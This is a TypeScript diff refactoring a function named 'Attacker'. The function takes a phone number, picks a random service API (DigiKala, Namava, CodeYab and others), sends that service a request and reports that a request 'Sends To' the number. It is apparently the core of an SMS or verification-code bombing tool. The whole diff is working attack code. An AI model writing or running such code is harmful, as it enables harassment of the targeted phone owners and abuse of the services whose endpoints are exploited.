@@ -1,64 +1,37 @@
-import axios from "axios";
+import axios, { AxiosRequestConfig } from "axios";
 import { API as APIs } from "./api";
 
 export const Attacker = async (num: number, Loop: string) => {
-  return new Promise((resolve, reject) => {
+  return new Promise(async (resolve, reject) => {
     const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
-    // const API = APIs(num)[0];
-    var headers: object;
-    headers = API.headers;
 
-    if (API.method == "POST") {
-      axios
-        .post(API.url, API.data, headers)
-        .then(
-          (res: {
-            status: number;
-            data: {
-              status: number;
-              message: string;
-              succeeded: boolean;
-              result: boolean;
-              isSuccess: boolean;
-              metaData: {
-                appStatusCode: string;
-              };
-              error: { message: string };
-            };
-          }) => {
-            if (API.name === "DigiKala" && res.data.status === 400) {
-              reject(`Request From ${API.name} Failed \n${res.data.message}`);
-            } else if (API.name === "Namava" && !res.data.succeeded) {
-              reject(
-                `Request From ${API.name} Failed \n${res.data.error.message}`
-              );
-            } else if (API.name === "ZarinPlus" && !res.data.status) {
-              reject(`Request From ${API.name} Failed \n${res.data.message}`);
-            } else if (API.name === "KasbinoApp" && !res.data.result) {
-              reject(`Request From ${API.name} Failed \n${res.data.status}`);
-            } else if (API.name === "Civapp" && !res.data) {
-              reject(`Request From ${API.name} Failed \n${res.data}`);
-            } else if (API.name === "CodeYab" && !res.data.isSuccess) {
-              reject(
-                `Request From ${API.name} Failed \n${res.data.metaData.appStatusCode}`
-              );
-            } else if (res.status === 200) {
-              resolve(`Request From ${API.name} Sends To ${num}`);
-            }
-          }
-        )
-        .catch((error: { response: { statusText: string } }) => {
-          reject(`${API.name} : \n${error?.response?.statusText}`);
-        });
-    } else {
-      axios
-        .get(API.url, headers)
-        .then(() => {
-          resolve(`Request From ${API.name} Sends To ${num}`);
-        })
-        .catch((error: { response: { statusText: string } }) => {
-          reject(`${API.name} : \n${error?.response?.statusText}`);
-        });
+    const config: AxiosRequestConfig = {
+      method: API.method,
+      url: API.url,
+      headers: API.headers,
+      data: API.data,
+    };
+    try {
+      const { data, status } = await axios(config);
+      if (API.name === "DigiKala" && data.status === 400) {
+        reject(`Request From ${API.name} Failed \n${data.message}`);
+      } else if (API.name === "Namava" && !data.succeeded) {
+        reject(`Request From ${API.name} Failed \n${data.error.message}`);
+      } else if (API.name === "ZarinPlus" && !data.status) {
+        reject(`Request From ${API.name} Failed \n${data.message}`);
+      } else if (API.name === "KasbinoApp" && !data.result) {
+        reject(`Request From ${API.name} Failed \n${data.status}`);
+      } else if (API.name === "Civapp" && !data) {
+        reject(`Request From ${API.name} Failed \n${data}`);
+      } else if (API.name === "CodeYab" && !data.isSuccess) {
+        reject(
+          `Request From ${API.name} Failed \n${data.metaData.appStatusCode}`
+        );
+      } else if (status === 200) {
+        resolve(`Request From ${API.name} Sends To ${num}`);
+      }
+    } catch (error) {
+      reject(`${API.name} : \n${error?.response?.statusText}`);
     }
   });
 };
